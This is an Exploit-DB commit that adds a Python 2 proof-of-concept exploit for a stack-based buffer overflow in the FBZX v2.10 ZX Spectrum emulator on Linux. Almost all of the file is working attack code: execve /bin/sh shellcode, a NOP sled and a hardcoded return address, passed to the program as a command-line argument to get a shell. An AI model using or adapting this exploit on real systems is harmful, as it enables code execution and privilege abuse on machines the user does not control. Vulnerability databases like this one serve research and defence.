26f0706a86a0a35a85a7fb151acde9461e346bb2
Offensive Security <info@exploit-db.com>
2015-11-12 05:03:25 +0000

    DB: 2015-11-12
    13 new exploits

---
+++ platforms/linux/local/38681.py
@@ -0,0 +1,48 @@
+# Exploit Author: Juan Sacco - http://www.exploitpack.com <jsacco@exploitpack.com>
+# Program: fbzx - ZX Spectrum Emulator for X
+# Tested on: GNU/Linux - Kali Linux 2.0 x86
+#
+# Description: FBZX v2.10 and prior is prone to a stack-based buffer overflow
+# vulnerability because the application fails to perform adequate
+# boundary-checks on user-supplied input.
+#
+# An attacker could exploit this issue to execute arbitrary code in the
+# context of the application. Failed exploit attempts will result in a
+# denial-of-service condition.
+#
+# Vendor homepage: *http://www.rastersoft.com/ <http://www.rastersoft.com/>*
+# Kali Linux 2.0 package: http://repo.kali.org/kali/pool/contrib/f/fbzx/
+# MD5: 0fc1d2e9c374c1156b2b02186a9f8980
+
+import os,subprocess
+def run():
+  try:
+    print "# FBZX v2.10 Stack-Based Overflow by Juan Sacco"
+    print "# It's Fuzzing time on unusable exploits"
+    print "# This exploit is for educational purposes only"
+    # Basic structure: JUNK + SHELLCODE + NOPS + EIP
+
+    junk = "\x41"*8
+    shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+    nops = "\x90"*5010
+    eip = "\x10\xd3\xff\xbf"
+    subprocess.call(["fbzx",'  ', junk + shellcode + nops + eip])
+
+  except OSError as e:
+    if e.errno == os.errno.ENOENT:
+        print "FBZX not found!"
+    else:
+        print "Error executing exploit"
+    raise
+
+def howtousage():
+  print "Sorry, something went wrong"
+  sys.exit(-1)
+
+if __name__ == '__main__':
+  try:
+    print "Exploit FBZX 2.10 Local Overflow Exploit"
+    print "Author: Juan Sacco"
+  except IndexError:
+    howtousage()
+run()
